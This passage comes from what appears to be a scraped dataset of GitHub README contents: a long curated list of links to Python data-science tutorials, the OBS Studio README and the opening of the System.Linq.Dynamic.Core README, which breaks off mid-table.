Everybody](https:\/\/www.coursera.org\/learn\/python)\n- [Python Programming Essentials](https:\/\/www.coursera.org\/learn\/python-programming)\n\n## Data Science with Python\n- [**Data Science IPython Notebooks**](https:\/\/github.com\/donnemartin\/data-science-ipython-notebooks)\n- [Awesome Python - Data Analysis](https:\/\/github.com\/vinta\/awesome-python#science-and-data-analysis)\n- Statistics\n  - [Statistics and Data Science](https:\/\/github.com\/svaksha\/pythonidae\/blob\/master\/Statistics.md)\n- [**An Introduction to Scientific Python (and a Bit of the Maths Behind It) \u2013 NumPy**](http:\/\/www.kdnuggets.com\/2016\/06\/intro-scientific-python-numpy.html)\n- [Data Analysis and IPython Notebooks](https:\/\/github.com\/kirang89\/pycrumbs#data-analysis)\n- [Python for Data Science: Basic Concepts](https:\/\/github.com\/gumption\/Python_for_Data_Science\/blob\/master\/2_Data_Science_Basic_Concepts.ipynb)\n- [Pycon India 2015 Notes](http:\/\/www.analyticsvidhya.com\/blog\/2015\/10\/notes-impressions-experience-excitement-pycon-india-2015\/)\n- [**5 important Python Data Science advancements of 2015**](https:\/\/medium.com\/@elgehelge\/the-5-most-important-python-data-science-advancements-of-2015-a136482da89b#.sp2c1la9z)\n- [Data Exploration with Numpy cheat sheet](http:\/\/www.analyticsvidhya.com\/blog\/2015\/07\/11-steps-perform-data-analysis-pandas-python)\n- [Querying Craiglist with Python](http:\/\/chrisholdgraf.com\/querying-craigslist-with-python\/?imm_mid=0d8940&cmp=em-data-na-na-newsltr_20150916)\n- [**An introduction to Numpy and Scipy**](http:\/\/www.engr.ucsb.edu\/~shell\/che210d\/numpy.pdf)\n- [Create NBA Shot Charts](http:\/\/savvastjortjoglou.com\/nba-shot-sharts.html)\n- [PythoR- Python meets R](http:\/\/nipunbatra.github.io\/2016\/01\/pythor\/)\n- [**How do I learn data analysis with Python?**](https:\/\/www.quora.com\/How-do-I-learn-data-analysis-with-Python?redirected_qid=2464720)\n- [What are some interesting things to do with Python?](https:\/\/www.quora.com\/Python-programming-language-What-are-some-interesting-things-to-do-with-Python?redirected_qid=2324227)\n- [**Which is better for data analysis: R or Python?**](https:\/\/www.quora.com\/Which-is-better-for-data-analysis-R-or-Python)\n- [**Web scraping in Python**](https:\/\/github.com\/ujjwalkarn\/Web-Scraping)\n- [The Guide to Learning Python for Data Science](http:\/\/www.datasciencecentral.com\/profiles\/blogs\/the-guide-to-learning-python-for-data-science-2)\n- [Python For Data Science - A Cheat Sheet For Beginners](https:\/\/www.datacamp.com\/community\/tutorials\/python-data-science-cheat-sheet-basics)\n- [Top voted Python data science questions](http:\/\/datascience.stackexchange.com\/questions\/tagged\/python)\n- [Awesome Python - Data Visualization](https:\/\/github.com\/vinta\/awesome-python#data-visualization)\n- [Awesome Python - Map Reduce](https:\/\/github.com\/vinta\/awesome-python#mapreduce)\n\n## Pandas Library in Python\n- [Intro to pandas data structures](http:\/\/www.gregreda.com\/2013\/10\/26\/intro-to-pandas-data-structures\/)\n- [Useful Pandas Cheatsheet](https:\/\/github.com\/pandas-dev\/pandas\/blob\/master\/doc\/cheatsheet\/Pandas_Cheat_Sheet.pdf)\n- [An Introduction to Scientific Python \u2013 Pandas](http:\/\/www.datadependence.com\/2016\/05\/scientific-python-pandas\/)\n- [10 minutes to Pandas](http:\/\/pandas.pydata.org\/pandas-docs\/stable\/10min.html)\n- [Useful Pandas Snippets](http:\/\/www.swegler.com\/becky\/blog\/2014\/08\/06\/useful-pandas-snippets\/)\n- [Timeseries analysis using Pandas](http:\/\/nbviewer.jupyter.org\/github\/twiecki\/financial-analysis-python-tutorial\/blob\/master\/1.%20Pandas%20Basics.ipynb)\n- [Pandas Exercises - Practice your Pandas skills](https:\/\/github.com\/guipsamora\/pandas_exercises)\n- [Grouping in Pandas](http:\/\/blog.yhat.com\/posts\/grouping-pandas.html)\n- [**\u201cLarge data\u201d work flows using pandas**](http:\/\/stackoverflow.com\/questions\/14262433\/large-data-work-flows-using-pandas)\n- [Easier data analysis with pandas (video series)](http:\/\/www.dataschool.io\/easier-data-analysis-with-pandas\/)\n- [Pandas Basics Cheat Sheet](https:\/\/www.datacamp.com\/community\/blog\/python-pandas-cheat-sheet)\n- Quick Operations on a Pandas DataFrame\n    - [Renaming Columns in Pandas](http:\/\/stackoverflow.com\/questions\/11346283\/renaming-columns-in-pandas) ([video](https:\/\/www.youtube.com\/watch?v=0uBirYFhizE&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=5))\n    - [Deleting Columns from pandas DataFrame](http:\/\/stackoverflow.com\/questions\/13411544\/delete-column-from-pandas-dataframe) ([video](https:\/\/www.youtube.com\/watch?v=gnUKkS964WQ&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=6))\n    - [Adding new Column to existing DataFrame](http:\/\/stackoverflow.com\/questions\/12555323\/adding-new-column-to-existing-dataframe-in-python-pandas)\n    - [Add one Row in a pandas.DataFrame](http:\/\/stackoverflow.com\/questions\/10715965\/add-one-row-in-a-pandas-dataframe)\n    - [Changing the order of DataFrame Columns](http:\/\/stackoverflow.com\/questions\/13148429\/how-to-change-the-order-of-dataframe-columns)\n    - [Changing data type of Columns](http:\/\/stackoverflow.com\/questions\/15891038\/pandas-change-data-type-of-columns) ([video](https:\/\/www.youtube.com\/watch?v=V0AWyzVMf54&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=13))\n    - [Getting a list of the column headers from a DataFrame](http:\/\/stackoverflow.com\/questions\/19482970\/get-list-from-pandas-dataframe-column-headers)\n    - [Converting list of dictionaries to Dataframe](http:\/\/stackoverflow.com\/questions\/20638006\/convert-list-of-dictionaries-to-dataframe)\n    - [Getting row count of pandas DataFrame](http:\/\/stackoverflow.com\/questions\/15943769\/how-to-get-row-count-of-pandas-dataframe)\n    - [Most efficient way to loop through DataFrames](http:\/\/stackoverflow.com\/questions\/7837722\/what-is-the-most-efficient-way-to-loop-through-dataframes-with-pandas)\n    - [Deleting DataFrame row based on column value](http:\/\/stackoverflow.com\/questions\/18172851\/deleting-dataframe-row-in-pandas-based-on-column-value)\n    - [Dropping a list of rows from Pandas DataFrame](http:\/\/stackoverflow.com\/questions\/14661701\/how-to-drop-a-list-of-rows-from-pandas-dataframe)\n    - [Sorting a DataFrame or a single column](https:\/\/www.youtube.com\/watch?v=zY4doF6xSxY&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=7)\n    - [Filtering DataFrame rows by column value](https:\/\/www.youtube.com\/watch?v=2AFGPdNn4FM&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=8)\n    - [Filtering DataFrame rows using multiple criteria](https:\/\/www.youtube.com\/watch?v=YPItfQ87qjM&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=9)\n    - [Dropping all non-numeric columns from a DataFrame](https:\/\/youtu.be\/B-r9VuK80dk?t=4m31s)\n    - [Counting and removing missing values](https:\/\/www.youtube.com\/watch?v=fCMrO_VzeL8&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=16)\n    - [Selecting multiple rows and columns from a DataFrame](https:\/\/www.youtube.com\/watch?v=xvpNA7bC8cs&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=19)\n    - [Reducing the size of a DataFrame](https:\/\/www.youtube.com\/watch?v=wDYDYGyN_cw&list=PL5-da3qGB5ICCsgW1MxlZ0Hq8LL5U3u9y&index=21)\n\n## Machine Learning with Python\n- [AI, ML Related List](https:\/\/github.com\/svaksha\/pythonidae\/blob\/master\/AI.md)\n- [Data Normalization in Python](http:\/\/blog.yhat.com\/posts\/data-normalization-in-python.html)\n- [**Python Machine Learning Book**](https:\/\/github.com\/rasbt\/python-machine-learning-book)\n- [Table of Contents and Code Notebooks](https:\/\/github.com\/rasbt\/python-machine-learning-book\/blob\/master\/README.md#table-of-contents-and-code-notebooks)\n- [Machine Learning with scikit learn](http:\/\/www.dataschool.io\/machine-learning-with-scikit-learn\/)\n- [Machine Learning Algorithms Cheatsheet](http:\/\/www.analyticsvidhya.com\/blog\/2015\/09\/full-cheatsheet-machine-learning-algorithms\/)\n- [**How to compute precision, recall, accuracy and f1-score for the multiclass case with scikit learn?**](http:\/\/stackoverflow.com\/questions\/31421413\/how-to-compute-precision-recall-accuracy-and-f1-score-for-the-multiclass-case)\n- [One Hot Encoding for Machine learning in Python](http:\/\/stackoverflow.com\/questions\/17469835\/one-hot-encoding-for-machine-learning)\n- [**Building a (semi) Autonomous Drone with Python**](http:\/\/blog.yhat.com\/posts\/autonomous-droning-with-python.html)\n- [Awesome Python - Machine Learning](https:\/\/github.com\/vinta\/awesome-python#machine-learning)\n- Computer Vision\n  - [Awesome Python - Computer Vision](https:\/\/github.com\/vinta\/awesome-python#computer-vision)\n\n## Scikit Learn\n- [scikit learn on Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Scikit-learn)\n- [**Introduction to machine learning with scikit-learn**](https:\/\/github.com\/justmarkham\/scikit-learn-videos), [**Videos!**](http:\/\/blog.kaggle.com\/author\/kevin-markham\/)\n- [**A Gentle Introduction to Scikit-Learn: A Python Machine Learning Library**](http:\/\/machinelearningmastery.com\/a-gentle-introduction-to-scikit-learn-a-python-machine-learning-library\/)\n- [**PyData Seattle 2015 Scikit-learn Tutorial**](https:\/\/github.com\/jakevdp\/sklearn_pydata2015), [sklearn_scipy2013](https:\/\/github.com\/jakevdp\/sklearn_scipy2013)\n- [SKLEARN BENCHMARKS: A centralized repository to report scikit-learn model performance across a variety of parameter settings and data sets](https:\/\/github.com\/rhiever\/sklearn-benchmarks), [Report results of sklearn benchmarks at openml.org](http:\/\/www.openml.org\/)\n- [How to get most informative features for scikit-learn classifiers?](http:\/\/stackoverflow.com\/questions\/11116697\/how-to-get-most-informative-features-for-scikit-learn-classifiers)\n- [**Code example to predict prices of Airbnb vacation rentals, using scikit-learn on Spark**](https:\/\/github.com\/mapr-demos\/spark-sklearn-airbnb-predict)\n- [**Machine Learning with scikit learn tutorial**](http:\/\/amueller.github.io\/sklearn_tutorial\/)\n- [Parallel and Large Scale Machine Learning with scikit-learn](https:\/\/speakerdeck.com\/ogrisel\/parallel-and-large-scale-machine-learning-with-scikit-learn), [Meetup](http:\/\/datasciencelondon.org\/machine-learning-python-scikit-learn-ipython-dsldn-data-science-london-kaggle\/)\n- [Saving classifier to disk in scikit-learn](http:\/\/stackoverflow.com\/questions\/10592605\/save-classifier-to-disk-in-scikit-learn)\n\n\n## Linear Regression in Python\n- [Linear Regression in Python](http:\/\/nbviewer.ipython.org\/github\/justmarkham\/DAT4\/blob\/master\/notebooks\/08_linear_regression.ipynb), [Blog Post](http:\/\/www.dataschool.io\/linear-regression-in-python\/)\n- [Linear Regression using Scikit Learn](http:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.linear_model.LinearRegression.html)\n- [A friendly introduction to linear regression (using Python)](http:\/\/www.dataschool.io\/linear-regression-in-python\/)\n- [Linear Regression Example in Python](http:\/\/scipy-cookbook.readthedocs.io\/items\/LinearRegression.html)\n- [Regression analysis using Python StatsModels package](http:\/\/www.turingfinance.com\/regression-analysis-using-python-statsmodels-and-quandl\/)\n- [Run an OLS regression with Pandas Data Frame](http:\/\/stackoverflow.com\/questions\/19991445\/run-an-ols-regression-with-pandas-data-frame)\n\n## Logistic Regression in Python\n- [Logistic Regression with scikit learn](http:\/\/www.dataschool.io\/logistic-regression-in-python-using-scikit-learn\/)\n- [Logistic Regression in Python](http:\/\/blog.yhat.com\/posts\/logistic-regression-and-python.html)\n- [Implementing the softmax function in Python](http:\/\/stackoverflow.com\/questions\/34968722\/softmax-function-python)\n- [**What is the inverse of regularization strength in Logistic Regression? How should it affect my code?**](http:\/\/stackoverflow.com\/questions\/22851316\/what-is-the-inverse-of-regularization-strength-in-logistic-regression-how-shoul)\n- [The Yhat Blog: Logistic Regression in Python](http:\/\/blog.yhat.com\/posts\/logistic-regression-and-python.html)\n- [Example of logistic regression in Python using scikit-learn](http:\/\/www.dataschool.io\/logistic-regression-in-python-using-scikit-learn\/)\n- [TUTORIAL ON LOGISTIC REGRESSION AND OPTIMIZATION IN PYTHON](https:\/\/learningwithdata.wordpress.com\/2015\/04\/30\/tutorial-on-logistic-regression-and-optimization-in-python\/)\n- [Using Logistic Regression in Python for Data Science](http:\/\/www.dummies.com\/how-to\/content\/using-logistic-regression-in-python-for-data-scien.html)\n\n## k Nearest Neighbours in Python\n- [A good tutorial on implementing K Nearest Neighbors using scikit learn](http:\/\/scikit-learn.org\/stable\/modules\/neighbors.html)\n- [**Is it possible to specify your own distance function using scikit-learn K-Means Clustering?**](http:\/\/stackoverflow.com\/questions\/5529625\/is-it-possible-to-specify-your-own-distance-function-using-scikit-learn-k-means)\n- [Tutorial To Implement k-Nearest Neighbors in Python From Scratch](http:\/\/machinelearningmastery.com\/tutorial-to-implement-k-nearest-neighbors-in-python-from-scratch\/)\n- [Implementing your own k-nearest neighbour algorithm using Python](https:\/\/blog.cambridgecoding.com\/2016\/01\/16\/machine-learning-under-the-hood-writing-your-own-k-nearest-neighbour-algorithm\/)\n- [knn Python implementation on StackOverflow](http:\/\/stackoverflow.com\/questions\/5565935\/k-nearest-neighbour-in-python)\n- [kNN with big sparse matrices in Python](http:\/\/stackoverflow.com\/questions\/20333092\/knn-with-big-sparse-matrices-in-python)\n- [Sklearn kNN usage with a user defined metric](http:\/\/stackoverflow.com\/questions\/21052509\/sklearn-knn-usage-with-a-user-defined-metric)\n\n\n## Neural Networks in Python\n- [Implementing a Neural Network from scratch in Python](http:\/\/www.wildml.com\/2015\/09\/implementing-a-neural-network-from-scratch\/), [Code](https:\/\/github.com\/dennybritz\/nn-from-scratch)\n- [A Neural Network in 11 lines of Python](http:\/\/iamtrask.github.io\/2015\/07\/12\/basic-python-network\/)\n- [Speeding up your Neural Network with Theano and the gpu](http:\/\/www.wildml.com\/2015\/09\/speeding-up-your-neural-network-with-theano-and-the-gpu\/), [Code](https:\/\/github.com\/dennybritz\/nn-theano)\n- [What is the best neural network library for Python?](https:\/\/www.quora.com\/What-is-the-best-neural-network-library-for-Python)\n- [Recurrent Neural Net Tutorial in Python Part 1](http:\/\/www.wildml.com\/2015\/09\/recurrent-neural-networks-tutorial-part-1-introduction-to-rnns\/), [Part 2](http:\/\/www.wildml.com\/2015\/09\/recurrent-neural-networks-tutorial-part-2-implementing-a-language-model-rnn-with-python-numpy-and-theano\/), [Code](https:\/\/github.com\/dennybritz\/rnn-tutorial-rnnlm\/)\n- [PyBrain: modular Machine Learning Library for Python](http:\/\/pybrain.org\/)\n- [Neural Networks Tutorial \u2013 a Pathway to Deep Learning](http:\/\/www.adventuresinmachinelearning.com\/neural-networks-tutorial\/)\n\n\n## Decision Trees in Python\n- [How to extract the decision rules from scikit-learn decision-tree?](http:\/\/stackoverflow.com\/questions\/20224526\/how-to-extract-the-decision-rules-from-scikit-learn-decision-tree)\n- [**How do I find which attributes my tree splits on, when using scikit-learn?**](http:\/\/stackoverflow.com\/questions\/20156951\/how-do-i-find-which-attributes-my-tree-splits-on-when-using-scikit-learn)\n- [Quora: What is a good Python library for decision trees?](https:\/\/www.quora.com\/What-is-a-good-Python-library-for-decision-trees), [StackOverflow](http:\/\/stackoverflow.com\/questions\/3127922\/what-is-a-good-python-library-for-decision-trees) \n- [Building Decision Trees in Python](http:\/\/www.onlamp.com\/pub\/a\/python\/2006\/02\/09\/ai_decision_trees.html?page=1)\n- [Pure Python Decision Trees](http:\/\/kldavenport.com\/pure-python-decision-trees\/)\n- [Building a decision tree from scratch in Python - a beginner's tutorial](http:\/\/www.patricklamle.com\/Tutorials\/Decision%20tree%20python\/tuto_decision%20tree.html)\n- [Using Python to Build and Use a Simple Decision Tree Classifier](https:\/\/github.com\/gumption\/Python_for_Data_Science\/blob\/master\/4_Python_Simple_Decision_Tree.ipynb)\n- [Decision trees in python with scikit-learn and pandas](http:\/\/chrisstrelioff.ws\/sandbox\/2015\/06\/08\/decision_trees_in_python_with_scikit_learn_and_pandas.html)\n- [Code for simple decision tree in Python](https:\/\/github.com\/gumption\/Python_for_Data_Science\/blob\/master\/simple_decision_tree.py)\n- [Lesson notebook: Regression and Classification Trees](http:\/\/nbviewer.jupyter.org\/github\/justmarkham\/DAT8\/blob\/master\/notebooks\/17_decision_trees.ipynb)\n- [Discover structure behind data with decision trees](http:\/\/vooban.com\/en\/tips-articles-geek-stuff\/discover-structure-behind-data-with-decision-trees\/)\n\n## Random Forest with Python\n- [Getting Started with Random Forests: Titanic Competition on Kaggle](https:\/\/www.kaggle.com\/c\/titanic\/details\/getting-started-with-random-forests), [Python sample code](https:\/\/www.kaggle.com\/c\/digit-recognizer\/forums\/t\/2299\/getting-started-python-sample-code-random-forest)\n- [RandomForestClassifier vs ExtraTreesClassifier in scikit learn](http:\/\/stackoverflow.com\/questions\/22409855\/randomforestclassifier-vs-extratreesclassifier-in-scikit-learn)\n- [Powerful Guide to learn Random Forest](http:\/\/www.analyticsvidhya.com\/blog\/2015\/09\/random-forest-algorithm-multiple-challenges\/)\n- [How are Feature Importances in RandomForestClassifier determined?](http:\/\/stackoverflow.com\/questions\/15810339\/how-are-feature-importances-in-randomforestclassifier-determined)\n- [Random forest interpretation with scikit-learn](http:\/\/blog.datadive.net\/random-forest-interpretation-with-scikit-learn\/)\n- [Random Forests in Python Tutorial](http:\/\/blog.yhat.com\/posts\/random-forests-in-python.html)\n- [Unbalanced classification using RandomForestClassifier in sklearn](http:\/\/stackoverflow.com\/questions\/20082674\/unbalanced-classification-using-randomforestclassifier-in-sklearn)\n- [Random Forest with categorical features in sklearn](http:\/\/stackoverflow.com\/questions\/24715230\/random-forest-with-categorical-features-in-sklearn)\n- [How to output RandomForest Classifier from python?](http:\/\/stackoverflow.com\/questions\/23000693\/how-to-output-randomforest-classifier-from-python)\n- [Lesson notebook: Ensembling, Bagging, and Random Forests](http:\/\/nbviewer.jupyter.org\/github\/justmarkham\/DAT8\/blob\/master\/notebooks\/18_ensembling.ipynb)\n\n## Support Vector Machine in Python\n- [Fastest SVM implementation usable in Python](http:\/\/stackoverflow.com\/questions\/9299346\/fastest-svm-implementation-usable-in-python)\n- [An example using python bindings for SVM library, LIBSVM](http:\/\/stackoverflow.com\/questions\/4214868\/an-example-using-python-bindings-for-svm-library-libsvm)\n- [What is the best SVM library usable from Python?](https:\/\/www.quora.com\/What-is-the-best-SVM-library-usable-from-Python)\n- [How does sklearn.svm.svc's function predict_proba() work internally?](http:\/\/stackoverflow.com\/questions\/15111408\/how-does-sklearn-svm-svcs-function-predict-proba-work-internally)\n- [Support vector machine in Python using libsvm example of features](http:\/\/stackoverflow.com\/questions\/30991592\/support-vector-machine-in-python-using-libsvm-example-of-features)\n- [Linear SVC Machine learning SVM example with Python](https:\/\/pythonprogramming.net\/linear-svc-example-scikit-learn-svm-python\/)\n- [Understanding Support Vector Machine algorithm from examples (along with code)](http:\/\/www.analyticsvidhya.com\/blog\/2015\/10\/understaing-support-vector-machine-example-code\/)\n\n## NLP \/ Text Mining in Python\n- [**NLP with Python ORiley Book**](http:\/\/www.nltk.org\/book_1ed\/), [Python 3](http:\/\/www.nltk.org\/book\/)\n- [Awesome Python - NLP](https:\/\/github.com\/vinta\/awesome-python#natural-language-processing)\n- [Awesome Python - Text Processing](https:\/\/github.com\/vinta\/awesome-python#text-processing)\n- [Text Analytics : Intro and Tokenization](http:\/\/a4analytics.blogspot.sg\/2015\/03\/text-mining-post-1.html)\n- [NLTK BOOK](http:\/\/www.nltk.org\/book\/ch01.html)\n- [Elegant N-gram Generation in Python](http:\/\/locallyoptimal.com\/blog\/2013\/01\/20\/elegant-n-gram-generation-in-python\/)\n- [**Computing N Grams using Python**](http:\/\/stackoverflow.com\/questions\/13423919\/computing-n-grams-using-python)\n- [N-grams: Explanation + 2 applications](http:\/\/stackoverflow.com\/questions\/1032288\/n-grams-explanation-2-applications)\n- [NLP Tutorial with Python](http:\/\/www.datasciencecentral.com\/profiles\/blogs\/python-nlp-tools)\n\n## Sentiment Analysis with Python\n- [A Comprehensive Guide to Sentiment Analysis](https:\/\/monkeylearn.com\/sentiment-analysis\/)\n- [Twitter-Sentiment-Analysis](https:\/\/github.com\/ujjwalkarn\/Twitter-Sentiment-Analysis)\n- [Basic Sentiment Analysis with Python](http:\/\/fjavieralba.com\/basic-sentiment-analysis-with-python.html)\n- [What is the best way to do Sentiment Analysis with Python?](https:\/\/www.quora.com\/What-is-the-best-way-to-do-Sentiment-Analysis-with-Python-1)\n- [How to Calculate Twitter Sentiment Using AlchemyAPI with Python](http:\/\/www.alchemyapi.com\/developers\/getting-started-guide\/twitter-sentiment-analysis)\n- [Second Try: Sentiment Analysis in Python](http:\/\/andybromberg.com\/sentiment-analysis-python\/)\n- [Sentiment Analysis with Python NLTK Text Classification](http:\/\/text-processing.com\/demo\/sentiment\/)\n- Codes and Explanation\n    - [**Sentiment Analysis with bag-of-words**](http:\/\/ataspinar.com\/2016\/01\/21\/sentiment-analysis-with-bag-of-words\/)\n    - [**Sentiment Analysis with Naive Bayes**](http:\/\/ataspinar.com\/2016\/02\/15\/sentiment-analysis-with-the-naive-bayes-classifier\/)\n\n## Pickle: convert a python object into a character stream\n- [Python serialization - Why pickle?](http:\/\/stackoverflow.com\/questions\/8968884\/python-serialization-why-pickle)\n- [**Serializing Python Objects**](http:\/\/www.diveinto.org\/python3\/serializing.html), [**Binary Files**](http:\/\/www.diveinto.org\/python3\/files.html#binary)\n- [What is Pickle in python ?](https:\/\/pythontips.com\/2013\/08\/02\/what-is-pickle-in-python\/)\n- [How to cPickle dump and load separate dictionaries to the same file?](http:\/\/stackoverflow.com\/questions\/11641493\/how-to-cpickle-dump-and-load-separate-dictionaries-to-the-same-file)\n- [**Understanding Pickling in Python**](http:\/\/stackoverflow.com\/questions\/7501947\/understanding-pickling-in-python)\n\n## AutoML\n- [TPOT: A Python tool for automating data science](http:\/\/www.randalolson.com\/2016\/05\/08\/tpot-a-python-tool-for-automating-data-science\/), [GitHub repo](https:\/\/github.com\/rhiever\/tpot)\n\n## Regex Related\n- [RegExr](http:\/\/regexr.com\/)\n- [Regex101](https:\/\/regex101.com\/)\n- [Pythex](http:\/\/pythex.org\/)\n- [How to use Regular Expressions (Regex) in Microsoft Excel both in-cell and loops](http:\/\/stackoverflow.com\/questions\/22542834\/how-to-use-regular-expressions-regex-in-microsoft-excel-both-in-cell-and-loops)\n- [Advanced Filters: Excel\u2019s Amazing Alternative To Regex](http:\/\/searchengineland.com\/advanced-filters-excels-amazing-alternative-to-regex-143680)\n\n## Shell Scripting\n- [**Calling an external command in Python**](http:\/\/stackoverflow.com\/questions\/89228\/calling-an-external-command-in-python)\n- [**Running shell command from Python and capturing the output**](http:\/\/stackoverflow.com\/questions\/4760215\/running-shell-command-from-python-and-capturing-the-output)\n- [**Can I use Python as a bash replacement?**](http:\/\/stackoverflow.com\/questions\/209470\/can-i-use-python-as-a-bash-replacement)\n- [Python Scripts as a Replacement for Bash Utility Scripts](http:\/\/www.linuxjournal.com\/content\/python-scripts-replacement-bash-utility-scripts)\n- [How to Write a Shell Script using Bash Shell in Ubuntu](https:\/\/www.youtube.com\/watch?v=He-5BpUGSag)\n- Red Hat Magazine | Python for Bash scripters: A well-kept secret\n- [Embed bash in python](http:\/\/stackoverflow.com\/questions\/2651874\/embed-bash-in-python)\n- [Bash2py: A Bash to Python Translator](https:\/\/cs.uwaterloo.ca\/~ijdavis\/bash2py-final.pdf)\n- [Beginners\/BashScripting](https:\/\/help.ubuntu.com\/community\/Beginners\/BashScripting)\n- [The Beginner\u2019s Guide to Shell Scripting: The Basics](http:\/\/www.howtogeek.com\/67469\/the-beginners-guide-to-shell-scripting-the-basics\/)\n- [Linux Shell Scripting Tutorial v1.05r3 A Beginner's handbook](http:\/\/www.freeos.com\/guides\/lsst\/)\n\n## Other good lists\n- [pycrumbs - Bits and bytes of Python from the Internet](https:\/\/github.com\/kirang89\/pycrumbs)\n- [python github projects - Collect and classify python projects on Github](https:\/\/github.com\/checkcheckzz\/python-github-projects)\n- [python reference - Useful functions, tutorials, and other Python-related things](https:\/\/github.com\/rasbt\/python_reference)\n- [pythonidae - Curated decibans of scientific programming resources in Python](https:\/\/github.com\/svaksha\/pythonidae)\n"},{"repo":"\/obsproject\/obs-studio","language":"C","readme_contents":"OBS Studio <https:\/\/obsproject.com>\n===================================\n\n.. image:: https:\/\/travis-ci.org\/obsproject\/obs-studio.svg?branch=master\n   :alt: OBS Studio Build Status - Travis CI\n   :target: https:\/\/travis-ci.org\/obsproject\/obs-studio\n\n.. image:: https:\/\/ci.appveyor.com\/api\/projects\/status\/github\/obsproject\/obs-studio?branch=master&svg=true\n   :alt: OBS Studio Build Status - AppVeyor CI\n   :target: https:\/\/ci.appveyor.com\/project\/jp9000\/obs-studio\/branch\/master\n\n.. image:: https:\/\/dev.azure.com\/obsjim\/obsjim\/_apis\/build\/status\/obsproject.obs-studio?branchName=master\n  :alt: OBS Studio Build Status - Azure Pipelines\n  :target: https:\/\/dev.azure.com\/obsjim\/obsjim\/_build\/latest?definitionId=1&branchName=master\n\n.. image:: https:\/\/discordapp.com\/api\/guilds\/348973006581923840\/widget.png?style=shield\n   :alt: OBS Studio Discord Server\n   :target: https:\/\/obsproject.com\/discord\n\n.. image:: https:\/\/d322cqt584bo4o.cloudfront.net\/obs-studio\/localized.svg\n   :alt: OBS Studio Translation Project Progress\n   :target: https:\/\/crowdin.com\/project\/obs-studio\n\nWhat is OBS Studio?\n-------------------\n\n  OBS Studio is software designed for capturing, compositing, encoding,\n  recording, and streaming video content, efficiently.\n\n  It's distributed under the GNU General Public License v2 (or any later\n  version) - see the accompanying COPYING file for more details.\n\nQuick Links\n-----------\n\n - Website: https:\/\/obsproject.com\n\n - Help\/Documentation\/Guides: https:\/\/github.com\/obsproject\/obs-studio\/wiki\n\n - Forums: https:\/\/obsproject.com\/forum\/\n\n - Build Instructions: https:\/\/github.com\/obsproject\/obs-studio\/wiki\/Install-Instructions\n\n - Developer\/API Documentation: https:\/\/obsproject.com\/docs\n\n - Donating\/backing\/sponsoring: https:\/\/obsproject.com\/contribute\n\n - Bug Tracker: https:\/\/obsproject.com\/mantis\/\n\n   (Note: The bug tracker is linked to forum accounts.  To use the bug\n   tracker, log in to a forum account)\n\nContributing\n------------\n\n - If you would like to help fund or sponsor the project, you can do so\n   via `Patreon <https:\/\/www.patreon.com\/obsproject>`_, `OpenCollective\n   <https:\/\/opencollective.com\/obsproject>`_, or `PayPal\n   <https:\/\/www.paypal.me\/obsproject>`_.  See our `contribute page\n   <https:\/\/obsproject.com\/contribute>`_ for more information.\n\n - If you wish to contribute code to the project, please make sure to\n   read the coding and commit guidelines:\n   https:\/\/github.com\/obsproject\/obs-studio\/blob\/master\/CONTRIBUTING.rst\n\n - Developer\/API documentation can be found here:\n   https:\/\/obsproject.com\/docs\n\n - If you wish to contribute translations, do not submit pull requests.\n   Instead, please use Crowdin.  For more information read this thread:\n   https:\/\/obsproject.com\/forum\/threads\/how-to-contribute-translations-for-obs.16327\/\n\n - Other ways to contribute are by helping people out with support on\n   our forums or in our community chat.  Please limit support to topics\n   you fully understand -- bad advice is worse than no advice.  When it\n   comes to something that you don't fully know or understand, please\n   defer to the official help or official channels.\n"},{"repo":"\/StefH\/System.Linq.Dynamic.Core","language":"HTML","readme_contents":"# System.Linq.Dynamic.Core\nThis is a **.NET Core \/ Standard port** of the Microsoft assembly for the .Net 4.0 Dynamic language functionality.\n\n# Overview\nWith this library it's possible to write Dynamic LINQ queries (string based) on an `IQueryable`:\n``` c#\nvar query = db.Customers\n    .Where(\"City == @0 and Orders.Count >= @1\", \"London\", 10)\n    .OrderBy(\"CompanyName\")\n    .Select(\"new(CompanyName as Name, Phone)\");\n```\n\n# How to use\nThere are several documentation resources:\n- [Wiki][doc-wiki] : an overview from the basic functionality  (correctness ~ 80%)\n- [API Documentation][doc-api] : a low-level API description website with some code samples\n- DynamicLinqWebDocs (TODO)\n\n# Info\n| | |\n| --- | --- |\n| ***Project*** | &nbsp; |\n| &nbsp;&nbsp;**Chat** | [![Gitter](https:\/\/img.shields.io\/gitter\/room\/system-linq-dynamic-core\/Lobby.svg)](https:\/\/gitter.im\/system-linq-dynamic-core\/Lobby) |\n| &nbsp;&nbsp;**Issues** | [![GitHub issues](https:\/\/img.shields.io\/github\/issues\/StefH\/System.Linq.Dynamic.Core.svg)](https:\/\/github.com\/StefH\/System.Linq.Dynamic.Core\/issues) |\n| | |\n| ***Quality*** | &nbsp; |\n| &nbsp;&nbsp;**Build Azure** | [![Build Status Azure](https:\/\/stef.visualstudio.com\/System.Linq.Dynamic.Core\/_apis\/build\/status\/StefH.System.Linq.Dynamic.Core)](https:\/\/stef.visualstudio.com\/System.Linq.Dynamic.Core\/_build\/latest?definitionId=12) |\n| &nbsp;&nbsp;**CodeFactor** | [![CodeFactor](https:\/\/www.codefactor.io\/repository\/github\/stefh\/system.linq.dynamic.core\/badge)](https:\/\/www.codefactor.io\/repository\/github\/stefh\/system.linq.dynamic.core)\n| &nbsp;&nbsp;**Sonar Quality Gate** | [![Sonar Quality Gate](https:\/\/sonarcloud.io\/api\/project_badges\/measure?project=system.linq.dynamic.core&metric=alert_status)](https:\/\/sonarcloud.io\/project\/issues?id=system.linq.dynamic.core) |\n| &nbsp;&nbsp;**Sonar Bugs** | [![Sonar Bugs](https:\/\/sonarcloud.io\/api\/project_badges\/measure?project=system.linq.dynamic.core&metric=bugs)](https:\/\/sonarcloud.io\/project\/issues?id=system.linq.dynamic.core&resolved=false&types=BUG) |\n| &nbsp;&nbsp;**Sonar Code Smells** | [![Sonar Code 